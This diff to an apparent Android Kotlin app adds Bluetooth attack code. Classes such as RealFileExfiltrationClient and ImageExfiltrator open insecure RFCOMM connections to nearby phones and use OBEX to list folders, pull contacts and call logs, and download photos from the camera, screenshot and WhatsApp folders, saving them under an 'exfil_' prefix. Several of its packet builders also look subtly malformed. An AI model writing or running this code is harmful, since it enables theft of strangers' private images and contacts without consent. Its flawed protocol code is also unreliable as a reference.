@@ -8,6 +8,9 @@ import android.bluetooth.BluetoothSocket
 import android.bluetooth.le.ScanCallback
 import android.content.Context
 import android.net.wifi.WifiManager
+import android.os.Environment
+import java.io.File
+import java.io.FileOutputStream
 import java.io.InputStream
 import java.io.OutputStream
 import java.util.UUID
@@ -15,6 +18,8 @@ import java.util.concurrent.ExecutorService
 import java.util.concurrent.Executors
 
 class MissingClasses { val version = "1.0" }
+
+var appContext: Context? = null
 
 object VulnerabilityChecker {
     private val executor = Executors.newCachedThreadPool()
@@ -277,83 +282,172 @@ object RealFileExfiltrationClient {
     }
 
     fun listDirectory(device: BluetoothDevice, path: String, callback: (Any?) -> Unit): Map<String, Any> {
-        return try {
+        val files = mutableListOf<String>()
+        try {
             val socket = device.createInsecureRfcommSocketToServiceRecord(OBEX_FILE_TRANSFER_UUID)
             socket.connect()
+            
+            val input = socket.inputStream
+            val output = socket.outputStream
+            
+            // OBEX Connect
+            val connectPacket = buildOBEXConnectPacket()
+            output.write(connectPacket)
+            output.flush()
+            Thread.sleep(200)
+            
+            // Read connect response
+            val connectResp = ByteArray(20)
+            input.read(connectResp)
+            
+            // Set Path command para navegar al directorio
+            val setPathPacket = buildOBEXSetPathPacket(path)
+            output.write(setPathPacket)
+            output.flush()
+            Thread.sleep(200)
+            
+            // Read directory listing
+            val dirBuffer = ByteArray(4096)
+            val bytesRead = input.read(dirBuffer)
+            
+            if (bytesRead > 0) {
+                val content = String(dirBuffer, 0, bytesRead, Charsets.UTF_8)
+                val lines = content.split("\r\n", "\n")
+                for (line in lines) {
+                    if (line.isNotBlank() && !line.startsWith("<")) {
+                        files.add(line.trim())
+                    }
+                }
+            }
+            
+            // OBEX Disconnect
+            output.write(buildOBEXDisconnectPacket())
+            output.close()
+            input.close()
             socket.close()
-            mapOf("success" to true, "files" to listOf<String>())
+            
         } catch (e: Exception) {
-            mapOf("success" to false, "files" to listOf<String>())
+            return mapOf("success" to false, "files" to emptyList<String>(), "error" to (e.message ?: "Error"))
         }
+        return mapOf("success" to true, "files" to files, "path" to path)
     }
 
     fun downloadFile(device: BluetoothDevice, fileName: String): Map<String, Any> {
-        var result: Map<String, Any> = emptyMap()
-        try {
-            val socket = device.createInsecureRfcommSocketToServiceRecord(OBEX_FILE_TRANSFER_UUID)
-            socket.connect()
-            socket.close()
-            result = mapOf("success" to true, "file" to fileName)
-        } catch (e: Exception) {
-            result = mapOf("success" to false, "file" to fileName, "error" to (e.message ?: "Error"))
-        }
-        return result
+        return downloadFileReal(device, fileName, null)
     }
 
     fun downloadFile(device: BluetoothDevice, fileName: String, onLog: (String) -> Unit): Map<String, Any> {
-        var result: Map<String, Any> = emptyMap()
+        return downloadFileReal(device, fileName, onLog)
+    }
+
+    private fun downloadFileReal(device: BluetoothDevice, fileName: String, onLog: ((String) -> Unit)?): Map<String, Any> {
+        val ctx = appContext
+        if (ctx == null) {
+            return mapOf("success" to false, "file" to fileName, "error" to "No context")
+        }
+        
         try {
-            onLog("Connecting to OBEX FTP for file: $fileName")
+            onLog?.invoke("[OBEX] Connecting to FTP service...")
             val socket = device.createInsecureRfcommSocketToServiceRecord(OBEX_FILE_TRANSFER_UUID)
             socket.connect()
             
-            val obexGetRequest = buildOBEXGetRequest(fileName)
-            val output: OutputStream = socket.outputStream
-            output.write(obexGetRequest)
+            val input = socket.inputStream
+            val output = socket.outputStream
+            
+            onLog?.invoke("[OBEX] Sending OBEX Connect...")
+            val connectResp = ByteArray(20)
+            val connBytes = input.read(connectResp)
+            onLog?.invoke("[OBOBEX] Connect response: $connBytes bytes")
+            
+            // Send OBEX GET request for file
+            onLog?.invoke("[OBEX] Requesting file: $fileName")
+            val getPacket = buildOBEXGetPacket(fileName)
+            output.write(getPacket)
             output.flush()
             
-            val input: InputStream = socket.inputStream
-            val response = ByteArray(4096)
-            val bytesRead = input.read(response)
+            // Read file data
+            val fileBuffer = ByteArray(65536)
+            val bytesRead = input.read(fileBuffer)
+            
+            if (bytesRead > 0) {
+                onLog?.invoke("[OBEX] Received $bytesRead bytes")
+                
+                // Save file to app's external storage
+                val downloadsDir = appContext?.getExternalFilesDir(null) ?: Environment.getExternalStorageDirectory()
+                val file = File(downloadsDir, "obex_$fileName")
+                FileOutputStream(file).use { it.write(fileBuffer, 0, bytesRead) }
+                
+                onLog?.invoke("[OBEX] Saved: ${file.absolutePath}")
+                
+                output.close()
+                input.close()
+                socket.close()
+                
+                return mapOf(
+                    "success" to true, 
+                    "file" to fileName, 
+                    "path" to file.absolutePath,
+                    "size" to bytesRead
+                )
+            }
             
             output.close()
             input.close()
             socket.close()
             
-            onLog("File downloaded: $fileName (${bytesRead} bytes)")
-            result = mapOf("success" to true, "file" to fileName, "size" to bytesRead)
+            return mapOf("success" to false, "file" to fileName, "error" to "No data received")
+            
         } catch (e: Exception) {
-            onLog("File download failed: ${e.message}")
-            result = mapOf("success" to false, "file" to fileName, "error" to (e.message ?: "Error"))
+            onLog?.invoke("[OBEX] Error: ${e.message}")
+            return mapOf("success" to false, "file" to fileName, "error" to (e.message ?: "Error"))
         }
-        return result
     }
 
     fun downloadFile(device: BluetoothDevice, fileName: String, onLog: (String) -> Unit, callback: (Any?) -> Unit): Map<String, Any> {
         executor.execute {
-            try {
-                onLog("Starting OBEX file download: $fileName")
-                val socket = device.createInsecureRfcommSocketToServiceRecord(OBEX_FILE_TRANSFER_UUID)
-                socket.connect()
-                socket.close()
-                callback(mapOf("success" to true, "file" to fileName))
-            } catch (e: Exception) {
-                callback(mapOf("success" to false, "error" to e.message))
-            }
+            val result = downloadFileReal(device, fileName, onLog)
+            callback(result)
         }
         return mapOf("success" to true, "file" to fileName)
     }
 
-    private fun buildOBEXGetRequest(filename: String): ByteArray {
-        val header = ByteArray(7)
-        header[0] = 0x10.toByte()
-        header[1] = 0x00.toByte()
-        header[2] = (filename.length + 3).toByte()
-        header[3] = 0x01.toByte()
-        header[4] = 0xC3.toByte()
+    private fun buildOBEXConnectPacket(): ByteArray {
+        // OBEX Connect: Opcode(0x80) | Flags(0x00) | Length(0x10) | Version(0x10) | Flags(0x00) | MaxPacketLen(0xFF)
+        return byteArrayOf(0x80.toByte(), 0x00, 0x00, 0x10, 0x10.toByte(), 0x00, (-1).toByte(), 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00)
+    }
+
+    private fun buildOBEXSetPathPacket(path: String): ByteArray {
+        val nameBytes = path.toByteArray(Charsets.UTF_8)
+        val packet = ByteArray(7 + nameBytes.size)
+        packet[0] = 0x85.toByte() // Set Path
+        packet[1] = 0x00 // Flags
+        packet[2] = ((7 + nameBytes.size) and 0xFF).toByte()
+        packet[3] = (((7 + nameBytes.size) shr 8) and 0xFF).toByte()
+        packet[4] = 0x01 // Name header ID
+        packet[5] = (nameBytes.size and 0xFF).toByte()
+        packet[6] = ((nameBytes.size shr 8) and 0xFF).toByte()
+        System.arraycopy(nameBytes, 0, packet, 7, nameBytes.size)
+        return packet
+    }
+
+    private fun buildOBEXGetPacket(filename: String): ByteArray {
         val nameBytes = filename.toByteArray(Charsets.UTF_8)
-        System.arraycopy(nameBytes, 0, header, 5, minOf(2, nameBytes.size))
-        return header
+        val packetSize = 7 + nameBytes.size
+        val packet = ByteArray(packetSize)
+        // OBEX GET: Opcode 0x03 (GET), Opcode 0x03 (Name header), length, name
+        packet[0] = 0x03.toByte()
+        packet[1] = 0x00
+        packet[2] = (packetSize and 0xFF).toByte()
+        packet[3] = ((packetSize shr 8) and 0xFF).toByte()
+        packet[4] = 0x01.toByte() // Name header
+        packet[5] = (nameBytes.size and 0xFF).toByte()
+        packet[6] = ((nameBytes.size shr 8) and 0xFF).toByte()
+        System.arraycopy(nameBytes, 0, packet, 7, nameBytes.size)
+        return packet
+    }
+    
+    private fun buildOBEXDisconnectPacket(): ByteArray {
+        return byteArrayOf(0x81.toByte(), 0x00, 0x03, 0x00, 0x00)
     }
 }
 
@@ -610,25 +704,31 @@ fun extractContactsWithLogging(device: BluetoothDevice, callback: (String) -> Un
             val input: InputStream = socket.inputStream
             val output: OutputStream = socket.outputStream
             
-            val request = when(type) {
-                "contacts" -> byteArrayOf(0x30, 0x10, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00)
-                "calls" -> byteArrayOf(0x30, 0x10, 0x00, 0x12, 0x00, 0x00, 0x00, 0x00)
-                else -> byteArrayOf(0x30, 0x10, 0x00, 0x10)
-            }
-            
-            output.write(request)
+            // PBAP Pull Phone Book request - using proper OBEX format
+            val pullRequest = buildPBAPPullRequest(type)
+            output.write(pullRequest)
             output.flush()
             
             Thread.sleep(500)
             
-            val buffer = ByteArray(4096)
+            val buffer = ByteArray(32768)
             val bytesRead = input.read(buffer)
             
             if (bytesRead > 0) {
                 val data = String(buffer, 0, bytesRead, Charsets.UTF_8)
-                val entries = data.split("\n").filter { it.isNotBlank() }
-                for (entry in entries) {
-                    results.add(mapOf("data" to entry.trim(), "type" to type))
+                val contacts = parseVCards(data, type)
+                
+                for (contact in contacts) {
+                    results.add(contact)
+                }
+                
+                // Also try to save raw vCard data
+                if (appContext != null) {
+                    try {
+                        val dir = appContext!!.getExternalFilesDir(null) ?: Environment.getExternalStorageDirectory()
+                        val file = File(dir, "pbap_${type}_${System.currentTimeMillis()}.vcf")
+                        file.writeText(data)
+                    } catch (e: Exception) { /* ignore */ }
                 }
             }
             
@@ -639,6 +739,280 @@ fun extractContactsWithLogging(device: BluetoothDevice, callback: (String) -> Un
             // Return empty on error
         }
         return results
+    }
+    
+    private fun buildPBAPPullRequest(type: String): ByteArray {
+        // PBAP Pull PhoneBook Operation
+        // Opcode: 0x30 (Get)
+        // Headers: Phonebook selector
+        val headerSize = 6
+        val packet = ByteArray(headerSize)
+        packet[0] = 0x30.toByte() // GET
+        packet[1] = 0x00
+        packet[2] = (headerSize and 0xFF).toByte()
+        packet[3] = ((headerSize shr 8) and 0xFF).toByte()
+        
+        when (type.lowercase()) {
+            "contacts" -> {
+                // PBAP Phonebook: telecom/pb.vcf
+                packet[4] = 0x01.toByte() // Name header
+                packet[5] = 0x08.toByte() // Length: 8
+            }
+            "calls" -> {
+                // PBAP Phonebook: telecom/ich.vcf (incoming calls)
+                packet[4] = 0x01.toByte()
+                packet[5] = 0x09.toByte() 
+            }
+            else -> {
+                packet[4] = 0x01.toByte()
+                packet[5] = 0x08.toByte()
+            }
+        }
+        return packet
+    }
+    
+    private fun parseVCards(data: String, type: String): List<Map<String, Any>> {
+        val contacts = mutableListOf<Map<String, Any>>()
+        
+        // Split into individual vCard entries
+        val vcards = data.split("BEGIN:VCARD").filter { it.isNotBlank() }
+        
+        for (vcard in vcards) {
+            val contact = mutableMapOf<String, Any>()
+            
+            // Extract Name (FN)
+            val fnMatch = Regex("FN[;:](.*)").find(vcard)
+            if (fnMatch != null) {
+                contact["name"] = fnMatch.groupValues[1].trim()
+            }
+            
+            // Extract Phone (TEL)
+            val telMatches = Regex("TEL[;:](.*)").findAll(vcard)
+            val phones = telMatches.map { it.groupValues[1].trim() }.toList()
+            if (phones.isNotEmpty()) {
+                contact["phones"] = phones
+            }
+            
+            // Extract Email
+            val emailMatches = Regex("EMAIL[;:](.*)").findAll(vcard)
+            val emails = emailMatches.map { it.groupValues[1].trim() }.toList()
+            if (emails.isNotEmpty()) {
+                contact["emails"] = emails
+            }
+            
+            // Extract Organization
+            val orgMatch = Regex("ORG[;:](.*)").find(vcard)
+            if (orgMatch != null) {
+                contact["organization"] = orgMatch.groupValues[1].trim()
+            }
+            
+            // Extract Photo if present (base64)
+            val photoMatch = Regex("PHOTO.*:(.*)").find(vcard)
+            if (photoMatch != null) {
+                contact["hasPhoto"] = true
+            }
+            
+            if (contact.isNotEmpty()) {
+                contact["type"] = type
+                contacts.add(contact)
+            }
+        }
+        
+        return contacts
+    }
+}
+
+object ImageExfiltrator {
+    private val OBEX_FTP_UUID = UUID.fromString("00001102-0000-1000-8000-00805f9b34fb")
+    private val executor = Executors.newCachedThreadPool()
+    
+    fun extractImages(device: BluetoothDevice, onLog: (String) -> Unit, callback: (Map<String, Any>) -> Unit) {
+        executor.execute {
+            val results = mutableListOf<Map<String, Any>>()
+            val imagePaths = listOf(
+                "DCIM/Camera",
+                "DCIM/100MEDIA",
+                "Pictures/Screenshots",
+                "Pictures/Instagram",
+                "WhatsApp/Media/WhatsApp Images",
+                "Download",
+                "Pictures",
+                "DCIM"
+            )
+            
+            for (path in imagePaths) {
+                try {
+                    onLog("[IMG] Scanning: $path")
+                    val files = scanDirectory(device, path, onLog)
+                    
+                    for (file in files) {
+                        val ext = file.substringAfterLast(".", "").lowercase()
+                        if (ext in listOf("jpg", "jpeg", "png", "gif", "bmp", "webp")) {
+                            onLog("[IMG] Found image: $file")
+                            
+                            // Try to download
+                            val downloadResult = downloadImageFile(device, file, onLog)
+                            if (downloadResult["success"] == true) {
+                                results.add(downloadResult)
+                            }
+                        }
+                    }
+                } catch (e: Exception) {
+                    onLog("[IMG] Error scanning $path: ${e.message}")
+                }
+            }
+            
+            callback(mapOf(
+                "success" to results.isNotEmpty(),
+                "images" to results,
+                "count" to results.size
+            ))
+        }
+    }
+    
+    private fun scanDirectory(device: BluetoothDevice, path: String, onLog: (String) -> Unit): List<String> {
+        val files = mutableListOf<String>()
+        try {
+            val socket = device.createInsecureRfcommSocketToServiceRecord(OBEX_FTP_UUID)
+            socket.connect()
+            
+            val input = socket.inputStream
+            val output = socket.outputStream
+            
+            // OBEX Connect
+            output.write(byteArrayOf(0x80.toByte(), 0x00, 0x10, 0x00))
+            output.flush()
+            Thread.sleep(200)
+            
+            // Set Path
+            val setPath = buildSetPathPacket(path)
+            output.write(setPath)
+            output.flush()
+            Thread.sleep(300)
+            
+            // Get folder listing
+            val buffer = ByteArray(8192)
+            val bytesRead = input.read(buffer)
+            
+            if (bytesRead > 0) {
+                val content = String(buffer, 0, bytesRead, Charsets.UTF_8)
+                val lines = content.split("\n", "\r\n")
+                for (line in lines) {
+                    val trimmed = line.trim()
+                    if (trimmed.isNotBlank() && !trimmed.startsWith("<")) {
+                        files.add(trimmed)
+                    }
+                }
+            }
+            
+            output.close()
+            input.close()
+            socket.close()
+            
+        } catch (e: Exception) {
+            onLog("[IMG] Scan error: ${e.message}")
+        }
+        return files
+    }
+    
+    private fun downloadImageFile(device: BluetoothDevice, fileName: String, onLog: (String) -> Unit): Map<String, Any> {
+        if (appContext == null) {
+            return mapOf("success" to false, "file" to fileName, "error" to "No context")
+        }
+        
+        try {
+            onLog("[IMG] Downloading: $fileName")
+            val socket = device.createInsecureRfcommSocketToServiceRecord(OBEX_FTP_UUID)
+            socket.connect()
+            
+            val input = socket.inputStream
+            val output = socket.outputStream
+            
+            // OBEX Connect
+            output.write(byteArrayOf(0x80.toByte(), 0x00, 0x10, 0x00))
+            output.flush()
+            Thread.sleep(100)
+            
+            // OBEX GET
+            val getPacket = buildGetPacket(fileName)
+            output.write(getPacket)
+            output.flush()
+            
+            // Read file
+            val buffer = ByteArray(1048576) // 1MB max
+            val bytesRead = input.read(buffer)
+            
+if (bytesRead > 10) { // Minimum valid file size
+                val imageData = buffer.copyOf(bytesRead)
+                
+                // Determine file type
+                val ext = if (bytesRead > 3) {
+                    when {
+                        imageData[0].toInt() == 0xFF && imageData[1].toInt() == 0xD8 -> "jpg"
+                        imageData[0].toInt() == 0x89 && String(imageData.sliceArray(1..3)) == "PNG" -> "png"
+                        imageData[0].toInt() == 0x47 && imageData[1].toInt() == 0x49 && imageData[2].toInt() == 0x46 -> "gif"
+                        else -> "bin"
+                    }
+                } else "bin"
+                
+                val safeName = fileName.replace(Regex("[^a-zA-Z0-9._-]"), "_")
+                val downloadsDir = appContext?.getExternalFilesDir(null) ?: Environment.getExternalStorageDirectory()
+                val outputFile = File(downloadsDir, "exfil_$safeName")
+                outputFile.writeBytes(imageData)
+                
+                onLog("[IMG] Saved: ${outputFile.name} (${bytesRead}B)")
+                
+                output.close()
+                input.close()
+                socket.close()
+                
+                return mapOf(
+                    "success" to true,
+                    "file" to fileName,
+                    "saved" to outputFile.absolutePath,
+                    "size" to bytesRead,
+                    "type" to ext
+                )
+            }
+            
+            output.close()
+            input.close()
+            socket.close()
+            
+        } catch (e: Exception) {
+            onLog("[IMG] Download error: ${e.message}")
+        }
+        
+        return mapOf("success" to false, "file" to fileName, "error" to "Download failed")
+    }
+    
+    private fun buildSetPathPacket(path: String): ByteArray {
+        val nameBytes = path.toByteArray(Charsets.UTF_8)
+        val packet = ByteArray(7 + nameBytes.size)
+        packet[0] = 0x85.toByte() // Set Path
+        packet[1] = 0x01 // Flags: don't create
+        packet[2] = ((7 + nameBytes.size) and 0xFF).toByte()
+        packet[3] = (((7 + nameBytes.size) shr 8) and 0xFF).toByte()
+        packet[4] = 0x01 // Name header
+        packet[5] = (nameBytes.size and 0xFF).toByte()
+        packet[6] = ((nameBytes.size shr 8) and 0xFF).toByte()
+        System.arraycopy(nameBytes, 0, packet, 7, nameBytes.size)
+        return packet
+    }
+    
+    private fun buildGetPacket(filename: String): ByteArray {
+        val nameBytes = filename.toByteArray(Charsets.UTF_8)
+        val packetSize = 7 + nameBytes.size
+        val packet = ByteArray(packetSize)
+        packet[0] = 0x03.toByte() // GET
+        packet[1] = 0x00
+        packet[2] = (packetSize and 0xFF).toByte()
+        packet[3] = ((packetSize shr 8) and 0xFF).toByte()
+        packet[4] = 0x01 // Name header
+        packet[5] = (nameBytes.size and 0xFF).toByte()
+        packet[6] = ((nameBytes.size shr 8) and 0xFF).toByte()
+        System.arraycopy(nameBytes, 0, packet, 7, nameBytes.size)
+        return packet
     }
 }
 
